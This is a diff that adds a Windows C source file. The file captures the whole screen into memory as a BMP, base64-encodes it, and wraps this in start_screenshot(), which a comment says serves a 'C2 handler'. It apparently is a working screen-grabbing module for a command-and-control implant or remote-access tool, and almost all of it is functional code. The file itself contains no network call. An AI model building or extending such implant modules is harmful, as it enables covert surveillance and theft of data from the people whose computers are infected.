@@ -1,0 +1,138 @@
+#include <windows.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+// Structure to hold screenshot data
+typedef struct {
+    unsigned char* data;
+    DWORD size;
+    int width;
+    int height;
+} ScreenshotData;
+
+// Function to capture screenshot to memory
+ScreenshotData* CaptureScreenshotToMemory(void) {
+    ScreenshotData* screenshot = (ScreenshotData*)malloc(sizeof(ScreenshotData));
+    if (screenshot == NULL) {
+        return NULL;
+    }
+
+    // Get the screen's device context
+    HDC hScreenDC = GetDC(NULL);
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+    screenshot->width = screenWidth;
+    screenshot->height = screenHeight;
+
+    // Create a compatible bitmap
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
+
+    // Select the bitmap into the memory DC
+    SelectObject(hMemoryDC, hBitmap);
+
+    // Copy the screen to the bitmap
+    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
+
+    // Get bitmap information
+    BITMAP bitmap;
+    GetObject(hBitmap, sizeof(BITMAP), &bitmap);
+
+    BITMAPINFOHEADER bi;
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = bitmap.bmWidth;
+    bi.biHeight = -bitmap.bmHeight;
+    bi.biPlanes = 1;
+    bi.biBitCount = 32;
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = 0;
+    bi.biXPelsPerMeter = 0;
+    bi.biYPelsPerMeter = 0;
+    bi.biClrUsed = 0;
+    bi.biClrImportant = 0;
+
+    DWORD dwBmpSize = ((bitmap.bmWidth * bi.biBitCount + 31) / 32) * 4 * bitmap.bmHeight;
+    DWORD dwTotalSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+
+    // Allocate memory for the bitmap data with headers
+    screenshot->data = (unsigned char*)malloc(dwTotalSize);
+    if (screenshot->data == NULL) {
+        free(screenshot);
+        DeleteObject(hBitmap);
+        DeleteDC(hMemoryDC);
+        ReleaseDC(NULL, hScreenDC);
+        return NULL;
+    }
+
+    screenshot->size = dwTotalSize;
+
+    // Create bitmap file header
+    BITMAPFILEHEADER bmfHeader;
+    bmfHeader.bfType = 0x4D42; // "BM"
+    bmfHeader.bfSize = dwTotalSize;
+    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+
+    // Copy headers to memory
+    memcpy(screenshot->data, &bmfHeader, sizeof(BITMAPFILEHEADER));
+    memcpy(screenshot->data + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
+
+    // Get the bitmap pixel data
+    unsigned char* bitmapData = screenshot->data + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    GetDIBits(hMemoryDC, hBitmap, 0, (UINT)bitmap.bmHeight, bitmapData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+
+    // Clean up
+    DeleteObject(hBitmap);
+    DeleteDC(hMemoryDC);
+    ReleaseDC(NULL, hScreenDC);
+
+    return screenshot;
+}
+
+// Function to free screenshot memory
+void FreeScreenshot(ScreenshotData* screenshot) {
+    if (screenshot != NULL) {
+        if (screenshot->data != NULL) {
+            free(screenshot->data);
+        }
+        free(screenshot);
+    }
+}
+
+// Base64 encoding function
+static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+char* base64_encode(const unsigned char* data, size_t data_len) {
+    size_t encoded_len = ((data_len + 2) / 3) * 4 + 1;
+    char* encoded = (char*)malloc(encoded_len);
+    if (!encoded) return NULL;
+    
+    size_t pos = 0;
+    for (size_t i = 0; i < data_len; i += 3) {
+        unsigned int b = (data[i] << 16) | (i + 1 < data_len ? (data[i + 1] << 8) : 0) | (i + 2 < data_len ? data[i + 2] : 0);
+        
+        encoded[pos++] = base64_chars[(b >> 18) & 0x3F];
+        encoded[pos++] = base64_chars[(b >> 12) & 0x3F];
+        encoded[pos++] = i + 1 < data_len ? base64_chars[(b >> 6) & 0x3F] : '=';
+        encoded[pos++] = i + 2 < data_len ? base64_chars[b & 0x3F] : '=';
+    }
+    encoded[pos] = '\0';
+    return encoded;
+}
+
+// Start screenshot - wrapper function for C2 handler
+// Returns base64-encoded BMP screenshot data
+char* start_screenshot() {
+    // Capture screenshot to memory
+    ScreenshotData* screenshot = CaptureScreenshotToMemory();
+    
+    if (screenshot) {
+        // Base64 encode the screenshot data
+        char* encoded = base64_encode(screenshot->data, screenshot->size);
+        FreeScreenshot(screenshot);
+        return encoded;
+    }
+    
+    return NULL;
+}
